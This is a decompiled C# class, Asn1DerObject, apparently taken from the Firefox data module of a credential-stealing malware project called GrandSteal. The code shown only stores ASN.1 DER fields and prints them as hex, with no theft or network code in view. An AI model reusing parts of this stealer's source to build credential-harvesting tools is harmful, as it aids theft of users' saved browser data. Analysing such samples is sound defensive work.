using System;
using System.Collections.Generic;
using System.Text;

namespace GrandSteal.Client.Data.Firefox
{
	// Token: 0x02000012 RID: 18
	public class Asn1DerObject
	{
		// Token: 0x1700001D RID: 29
		// (get) Token: 0x0600005E RID: 94 RVA: 0x00002355 File Offset: 0x00000555
		// (set) Token: 0x0600005F RID: 95 RVA: 0x0000235D File Offset: 0x0000055D
		public Asn1Der.Type Type { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000060 RID: 96 RVA: 0x00002366 File Offset: 0x00000566
		// (set) Token: 0x06000061 RID: 97 RVA: 0x0000236E File Offset: 0x0000056E
		public int Lenght { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x06000062 RID: 98 RVA: 0x00002377 File Offset: 0x00000577
		// (set) Token: 0x06000063 RID: 99 RVA: 0x0000237F File Offset: 0x0000057F
		public List<Asn1DerObject> objects { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x06000064 RID: 100 RVA: 0x00002388 File Offset: 0x00000588
		// (set) Token: 0x06000065 RID: 101 RVA: 0x00002390 File Offset: 0x00000590
		public byte[] Data { get; set; }

		// Token: 0x06000066 RID: 102 RVA: 0x00002399 File Offset: 0x00000599
		public Asn1DerObject()
		{
			this.objects = new List<Asn1DerObject>();
		}

		// Token: 0x06000067 RID: 103 RVA: 0x000048E4 File Offset: 0x00002AE4
		public override string ToString()
		{
			StringBuilder stringBuilder = new StringBuilder();
			StringBuilder stringBuilder2 = new StringBuilder();
			Asn1Der.Type type = this.Type;
			switch (type)
			{
			case Asn1Der.Type.Integer:
				foreach (byte b in this.Data)
				{
					stringBuilder2.AppendFormat("{0:X2}", b);
				}
				stringBuilder.AppendLine("\tINTEGER " + stringBuilder2);
				break;
			case Asn1Der.Type.BitString:
			case Asn1Der.Type.Null:
				break;
			case Asn1Der.Type.OctetString:
				foreach (byte b2 in this.Data)
				{
					stringBuilder2.AppendFormat("{0:X2}", b2);
				}
				stringBuilder.AppendLine("\tOCTETSTRING " + stringBuilder2.ToString());
				break;
			case Asn1Der.Type.ObjectIdentifier:
				foreach (byte b3 in this.Data)
				{
					stringBuilder2.AppendFormat("{0:X2}", b3);
				}
				stringBuilder.AppendLine("\tOBJECTIDENTIFIER " + stringBuilder2.ToString());
				break;
			default:
				if (type == Asn1Der.Type.Sequence)
				{
					stringBuilder.AppendLine("SEQUENCE {");
				}
				break;
			}
			foreach (Asn1DerObject asn1DerObject in this.objects)
			{
				stringBuilder.Append(asn1DerObject.ToString());
			}
			if (this.Type.Equals(Asn1Der.Type.Sequence))
			{
				stringBuilder.AppendLine("}");
			}
			stringBuilder2.Remove(0, stringBuilder2.Length - 1);
			return stringBuilder.ToString();
		}
	}
}
